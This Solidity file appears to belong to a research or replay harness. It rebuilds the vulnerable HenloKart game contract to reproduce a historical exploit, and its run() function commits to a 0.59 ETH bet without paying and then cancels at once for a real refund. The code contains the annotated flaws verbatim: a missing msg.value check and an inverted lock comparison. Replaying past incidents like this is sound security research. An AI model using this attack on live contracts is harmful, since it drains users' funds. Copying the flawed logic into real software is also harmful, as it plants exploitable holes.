// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

// Synthetic standalone exploit for the EVM Playground (2025-02-HenloKart).
//
// The DeFiHackLabs PoC (test/HenloKart_exp.sol) runs the whole attack INLINE
// in the Foundry test contract (attacker = address(this); no exploit
// contract), so there is no standalone contract to deploy — see
// scripts/poc-configs/README.md "syntheticExploit".
//
// A SECOND, independent problem makes this PoC harder than a normal
// syntheticExploit: the committed anvil_state.json dump for the HenloKart
// proxy (0x27faFC21...) has its ERC-1967 implementation storage slot set to
// address(0) (see evm-hack-registry/2025-02-HenloKart_exp/HenloKart_exp.md,
// "Note on local status"). The proxy's own bytecode is present and correct,
// but delegatecalls resolve to empty code and silently no-op — the real
// on-chain tx used a since-upgraded implementation that isn't recoverable
// from this dump. To make the exploit mechanically reproducible we `vm.etch`
// (config `exploitContract.etchAt`) a minimal, hand-authored
// re-implementation of the exact vulnerable logic DIRECTLY at the proxy's
// own address (0x27faFC21...), using the SAME ERC-7201 storage slot as the
// real contract (`keccak256(abi.encode(uint256(keccak256("henlo_kart.store"))
// - 1)) & ~bytes32(uint256(0xff))`) so it reads/writes the proxy's own
// (all-zero) storage exactly like the real implementation would. The logic
// itself — commitToRace / cancelCommitment / Transfers.transferEth — is
// copied verbatim from the verified source at
// evm-hack-registry/2025-02-HenloKart_exp/sources/HenloKart_5E30de/.
//
// The real IJackpotV1 dependency is also not present in the dump. Its only
// observable effect on this attack path is how many credits it reports
// available (fundCommitment/refundCommitment's return value) — the
// historical attacker had no pre-existing jackpot credit balance, so the
// real jackpot would have returned 0 credits either way. That is inlined
// directly (`creditsUsed = 0`) instead of routing through a stub contract,
// since the real attack does not rely on credits at all.
//
// `run()` (the recorded attackFunction, called with caller = attacker EOA
// since the contract is etched, not deployed) does three things in order,
// byte-for-byte mirroring ContractTest.testExploit():
//   1. One-time init: enable racing + ETH as a bet token (0/0.001/0.01 ether)
//      + register the historical hamster agent — this replicates the real
//      contract's post-initialize() state, which the dump does not capture.
//   2. commitToRace(player=msg.sender, agent=HISTORICAL_AGENT,
//      betToken=address(0), betSize=0.01 ether, count=59) with msg.value=0 —
//      reproduces the missing-msg.value-binding bug (Transfers.transferEth's
//      `from == msg.sender` branch pays out of address(this) unconditionally).
//   3. cancelCommitment(commitmentHash) — reproduces the inverted lock check
//      (`lockedUntil < block.timestamp` instead of the other way round),
//      which lets the bogus 0.59 ETH commitment be cancelled immediately for
//      a real 0.59 ETH refund out of HenloKart's balance.
//
// Root-cause writeup: evm-hack-registry/2025-02-HenloKart_exp/HenloKart_exp.md

// Minimal re-implementation of the vulnerable HenloKart logic, etched
// directly onto the real proxy address (0x27faFC21...) via `etchAt` so it
// reads/writes the proxy's own (all-zero, in this dump) storage — see the
// header note above for why the dump's real implementation slot can't be
// replayed as-is. Faithfully copied from the verified source at
// evm-hack-registry/2025-02-HenloKart_exp/sources/HenloKart_5E30de/
// contracts_games_HenloKart_HenloKart.sol (commitToRace / cancelCommitment /
// initialize / toggleRacing) and .../contracts_libraries_Transfers.sol
// (transferEth / transferToken). Only the code paths the PoC actually
// exercises are reproduced; everything else (races, jackpot rewards, RNG,
// NFTs) is omitted since it is unreachable from this attack. Because `etchAt`
// places runtime code without running a constructor, initialization happens
// lazily on the first call to run() instead.
contract HenloKartImpl {
    // keccak256(abi.encode(uint256(keccak256("henlo_kart.store")) - 1)) & ~bytes32(uint256(0xff))
    bytes32 private constant STORAGE_SLOT = 0x0908838cd9d9fbd029f993dbea29da431831a735ce97f0fa3ea0921461d8f700;

    address constant HISTORICAL_AGENT = 0xddb9FcCd82C4f5fAB67140EFfd8a744E5b3b101a;

    struct RaceCommitment {
        address player;
        address agent;
        address betToken;
        uint256 tokenId;
        uint256 betSize;
        uint256 creditsUsed;
        uint64 deadline;
        uint64 count;
    }

    struct Store {
        mapping(address => bool) betTokenEnabled;
        mapping(address => mapping(uint256 => bool)) betSizeEnabled;
        mapping(bytes32 => RaceCommitment) raceCommitments;
        mapping(bytes32 => uint256) commitmentLockStart;
        uint256 commitmentLockPeriod;
        bool isRacingEnabled;
        bool initialized;
    }

    error TransferFailed();
    error RacingNotEnabled();
    error InvalidBetToken(address);
    error InvalidBetSizeForToken(address, uint256);
    error DuplicateCommitment(bytes32);
    error InvalidCommitmentPlayer();
    error CommitmentLocked(uint256);

    // NOTE: this contract is placed via vm.etch-equivalent (`etchAt`), so no
    // constructor ever runs — no immutables, no constructor-set state. Every
    // storage read/write goes through the erc7201 Store below (the proxy's
    // own storage, already zeroed in the dump).

    function _store() private pure returns (Store storage $) {
        bytes32 slot = STORAGE_SLOT;
        assembly {
            $.slot := slot
        }
    }

    // --- Transfers.transferEth, copied verbatim (the bug lives here) --------
    function _transferEth(address from, address to, uint256 amount) private {
        if (from == msg.sender || from == address(this)) {
            // BUG: pays `amount` out of address(this) whenever `from == msg.sender`,
            // with NO check that msg.value actually carried that amount.
            if (to.code.length == 0) {
                payable(to).transfer(amount);
            } else {
                (bool success,) = to.call{gas: 10000, value: amount}("");
                if (!success) revert TransferFailed();
            }
        } else if (to == msg.sender || to == address(this)) {
            if (msg.value < amount) revert TransferFailed();
        }
    }

    function _initOnce() private {
        Store storage $ = _store();
        if ($.initialized) return;
        $.initialized = true;
        $.commitmentLockPeriod = 1 days;

        address betToken = address(0);
        $.betTokenEnabled[betToken] = true;
        $.betSizeEnabled[betToken][0] = true;
        $.betSizeEnabled[betToken][0.001 ether] = true;
        $.betSizeEnabled[betToken][0.01 ether] = true;
        $.isRacingEnabled = true;
    }

    // --- IHenloKartV1.commitToRace, copied verbatim for the ETH bet path ----
    function commitToRace(
        address player,
        address agent,
        address betToken,
        uint256 tokenId,
        uint256 betSize,
        uint64 deadline,
        uint64 count
    ) public payable returns (bytes32 commitmentHash) {
        Store storage $ = _store();

        if (!$.isRacingEnabled) revert RacingNotEnabled();
        if (!$.betTokenEnabled[betToken]) revert InvalidBetToken(betToken);
        if (!$.betSizeEnabled[betToken][betSize]) revert InvalidBetSizeForToken(betToken, betSize);

        commitmentHash = keccak256(abi.encodePacked(player, agent, betToken, tokenId, betSize, deadline, count));
        if ($.raceCommitments[commitmentHash].player != address(0)) revert DuplicateCommitment(commitmentHash);

        uint256 creditsUsed;
        if (betSize != 0) {
            uint256 deposit = betSize * uint256(count);
            // The real IJackpotV1.fundCommitment would return 0 credits here —
            // the historical attacker had no pre-existing jackpot balance.
            creditsUsed = 0;
            uint256 valueOwed = deposit - creditsUsed;

            // BUG: from == msg.sender routes into the send-from-contract branch —
            // no msg.value is ever required, so the "deposit" is never actually paid.
            _transferEth(msg.sender, address(this), valueOwed);
            if (betToken == address(0) && msg.value > valueOwed) {
                _transferEth(address(this), msg.sender, msg.value - valueOwed);
            }
        }

        $.raceCommitments[commitmentHash] =
            RaceCommitment(player, agent, betToken, tokenId, betSize, creditsUsed, deadline, count);
        $.commitmentLockStart[commitmentHash] = block.timestamp;
    }

    // --- IHenloKartV1.cancelCommitment, copied verbatim ----------------------
    function cancelCommitment(bytes32 commitmentHash) public {
        Store storage $ = _store();
        RaceCommitment memory rc = $.raceCommitments[commitmentHash];
        if (rc.player != msg.sender) revert InvalidCommitmentPlayer();

        uint256 lockedUntil = $.commitmentLockStart[commitmentHash] + $.commitmentLockPeriod;
        // BUG: inverted comparison — should be `block.timestamp < lockedUntil`.
        // As written this only blocks cancellation AFTER the lock has expired,
        // so cancellation succeeds immediately, while the lock should still be
        // active.
        if (lockedUntil < block.timestamp) revert CommitmentLocked(lockedUntil);

        uint256 unusedCount = rc.count;
        if (rc.betSize != 0) {
            uint256 deposit = rc.betSize * unusedCount;
            // The real IJackpotV1.refundCommitment would also return 0 credits
            // refunded here, for the same reason as commitToRace above.
            uint256 creditsRefunded = 0;
            uint256 betTokenOwed = deposit - creditsRefunded;
            if (betTokenOwed > 0) {
                // Pays real ETH out of address(this) to the caller.
                _transferEth(address(this), rc.player, betTokenOwed);
            }
        }

        delete $.raceCommitments[commitmentHash];
    }

    // Recorded attack entrypoint. Called with caller = the historical attacker
    // EOA directly against the etched proxy address, so msg.sender throughout
    // this function IS the attacker — matching `player = address(this)` /
    // `msg.sender` in the original inline Foundry test.
    function run() external {
        _initOnce();

        bytes32 commitmentHash =
            commitToRace(msg.sender, HISTORICAL_AGENT, address(0), 0, 0.01 ether, 0, 59);
        cancelCommitment(commitmentHash);
    }

    receive() external payable {}
}
